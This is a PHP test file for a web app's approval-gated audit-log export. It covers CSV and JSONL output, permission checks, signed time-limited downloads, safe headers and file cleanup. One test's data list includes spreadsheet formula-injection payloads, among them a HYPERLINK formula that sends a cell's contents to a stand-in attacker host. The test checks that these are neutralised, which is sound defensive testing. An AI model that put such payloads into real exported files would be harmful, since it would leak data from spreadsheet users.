<?php

use App\Enums\ApprovalEvent;
use App\Enums\ApprovalStatus;
use App\Models\ApprovalRequest;
use App\Models\AuditEvent;
use App\Models\Staff;
use App\Services\Approvals\Approvals;
use App\Services\Audit\Audit;
use Illuminate\Auth\Access\AuthorizationException;
use Illuminate\Support\Facades\Storage;
use Illuminate\Validation\ValidationException;

require_once __DIR__.'/Helpers.php';

/**
 * audit.export (06_ADMIN_SPEC §2 four-eyes list, contract §1.5): asked by one staff member, approved by another, written to the private
 * disk, downloadable by the requester alone for 24 hours through a signed link, every download audited, then removed.
 */
function m31ExportApproved(Staff $requester, string $format = 'csv', array $filter = []): ApprovalRequest
{
    $approvals = app(Approvals::class);
    $request = $approvals->request('audit.export', ['format' => $format, 'filter' => $filter], 'Prüfung für die Datenschutzbehörde.', $requester);

    return $approvals->approve($request, m31Staff('owner'));
}

beforeEach(function () {
    Storage::fake(config()->string('speedclub.media.private_disk'));
});

it('writes the filtered events as CSV, without IP addresses, and audits the export itself', function () {
    $admin = m31Staff('admin');
    Audit::record('member.test_one', actor: $admin);
    Audit::record('vehicle.test_two', actor: $admin);

    $done = m31ExportApproved($admin, filter: ['action' => 'member.']);

    expect($done->status)->toBe(ApprovalStatus::Executed)
        ->and($done->result['rows'])->toBe(1)
        ->and($done->result['format'])->toBe('csv');

    $csv = Storage::disk(config()->string('speedclub.media.private_disk'))->get((string) $done->result['file']);
    expect($csv)->toStartWith('id,occurred_at,actor_type')
        ->toContain('member.test_one')
        ->not->toContain('vehicle.test_two')
        ->not->toContain('127.0.0.1');

    $exported = AuditEvent::query()->where('action', 'audit.exported')->sole();
    expect($exported->after['requested_by'])->toBe($admin->id)->and($exported->after['rows'])->toBe(1);
});

it('writes JSONL as well', function () {
    $admin = m31Staff('admin');
    Audit::record('member.test_one', actor: $admin);

    $done = m31ExportApproved($admin, 'jsonl', ['action' => 'member.']);
    $lines = array_filter(explode("\n", (string) Storage::disk(config()->string('speedclub.media.private_disk'))->get((string) $done->result['file'])));

    expect(json_decode((string) $lines[0], true)['action'])->toBe('member.test_one');
});

it('fails instead of writing an export larger than the limit', function () {
    config(['speedclub.approvals.audit_export_max_rows' => 1]);
    $admin = m31Staff('admin');
    Audit::record('member.a', actor: $admin);
    Audit::record('member.b', actor: $admin);

    expect(m31ExportApproved($admin, filter: ['action' => 'member.'])->status)->toBe(ApprovalStatus::Failed);
});

it('lets the requester download through the signed link, audited', function () {
    $admin = m31Staff('admin');
    $done = m31ExportApproved($admin);
    $url = (string) app(Approvals::class)->downloadUrl($done);

    $this->actingAs($admin, 'staff')->get($url)
        ->assertOk()
        ->assertHeader('Content-Type', 'text/csv; charset=UTF-8')
        ->assertHeader('Cache-Control', 'no-store, private');

    expect(AuditEvent::query()->where('action', ApprovalEvent::ExportDownloaded->value)->where('actor_id', (string) $admin->id)->count())->toBe(1);
});

it('keeps the file from everyone else, from an unsigned link and after 24 hours', function () {
    $admin = m31Staff('admin');
    $done = m31ExportApproved($admin);
    $url = (string) app(Approvals::class)->downloadUrl($done);

    $this->get($url)->assertRedirect('/admin/login');
    $this->actingAs(m31Staff('owner'), 'staff')->get($url)->assertNotFound();
    $this->actingAs($admin, 'staff')->get(route('admin.approvals.download', ['approval' => $done->id]))->assertForbidden();

    $this->travel(25)->hours();
    $this->actingAs($admin, 'staff')->get($url)->assertForbidden();
    expect(app(Approvals::class)->downloadUrl($done->fresh() ?? $done))->toBeNull();
});

it('removes the file once the download window has passed', function () {
    $done = m31ExportApproved(m31Staff('admin'));
    $file = (string) $done->result['file'];
    $this->travel(25)->hours();

    $this->artisan('approvals:expire')->assertSuccessful();

    expect(Storage::disk(config()->string('speedclub.media.private_disk'))->exists($file))->toBeFalse()
        ->and($done->fresh()?->result)->not->toHaveKey('file');
});

it('refuses a requester without audit.export', function (string $role) {
    expect(fn () => app(Approvals::class)->request('audit.export', ['format' => 'csv', 'filter' => []], 'Prüfung für die Datenschutzbehörde.', m31Staff($role)))
        ->toThrow(AuthorizationException::class);
})->with(['moderator', 'support', 'content_editor', 'analyst']);

it('refuses a malformed filter', function () {
    expect(fn () => app(Approvals::class)->request('audit.export', ['format' => 'xml', 'filter' => ['from' => '2026-11-09', 'to' => '2026-01-01']], 'Prüfung für die Datenschutzbehörde.', m31Staff('admin')))
        ->toThrow(ValidationException::class);
});

it('writes formula cells as text in CSV and keeps JSONL raw (SF-5, SEC-P3-06)', function (string $reason, string $cell) {
    $admin = m31Staff('admin');
    Audit::record('member.test_formula', reason: $reason, actor: $admin);

    $csv = (string) Storage::disk(config()->string('speedclub.media.private_disk'))->get((string) m31ExportApproved($admin, filter: ['action' => 'member.test_formula'])->result['file']);
    $row = str_getcsv(explode("\n", trim($csv))[1], escape: '');

    expect($row[9])->toBe($cell);

    $jsonl = (string) Storage::disk(config()->string('speedclub.media.private_disk'))->get((string) m31ExportApproved($admin, 'jsonl', ['action' => 'member.test_formula'])->result['file']);
    expect(json_decode(trim($jsonl), true)['reason'])->toBe($reason);
})->with([
    'equals' => ['=1+1', "'=1+1"],
    'hyperlink' => ['=HYPERLINK("https://evil.example/?"&A1,"Details")', "'=HYPERLINK(\"https://evil.example/?\"&A1,\"Details\")"],
    'plus' => ['+49 151 1234567', "'+49 151 1234567"],
    'minus' => ['-2+3', "'-2+3"],
    'at' => ['@SUM(A1)', "'@SUM(A1)"],
    'tab' => ["\tTab", "'\tTab"],
    'carriage return' => ["\rCR", "'\rCR"],
    'plain' => ['Ticket 4711', 'Ticket 4711'],
]);

it('answers the download as a no-store attachment that is never sniffed (SF-6)', function () {
    $admin = m31Staff('admin');
    $done = m31ExportApproved($admin);

    $response = $this->actingAs($admin, 'staff')->get((string) app(Approvals::class)->downloadUrl($done))->assertOk();

    expect((string) $response->headers->get('Cache-Control'))->toContain('no-store')->toContain('private')
        ->and($response->headers->get('Pragma'))->toBe('no-cache')
        ->and($response->headers->get('X-Content-Type-Options'))->toBe('nosniff')
        ->and((string) $response->headers->get('Content-Disposition'))->toStartWith('attachment;')->toContain('speedclub-audit-');
});

it('sweeps an export file whose approval never committed (review N-9)', function () {
    $disk = Storage::disk(config()->string('speedclub.media.private_disk'));
    $prefix = config()->string('speedclub.approvals.disk_prefix');
    $kept = m31ExportApproved(m31Staff('admin'));
    $disk->put($prefix.'/01jorphan0000000000000000.csv', 'id');

    $this->travel(2)->hours();
    $this->artisan('approvals:expire')->assertSuccessful();

    expect($disk->exists($prefix.'/01jorphan0000000000000000.csv'))->toBeFalse()
        ->and($disk->exists((string) $kept->result['file']))->toBeTrue();
});
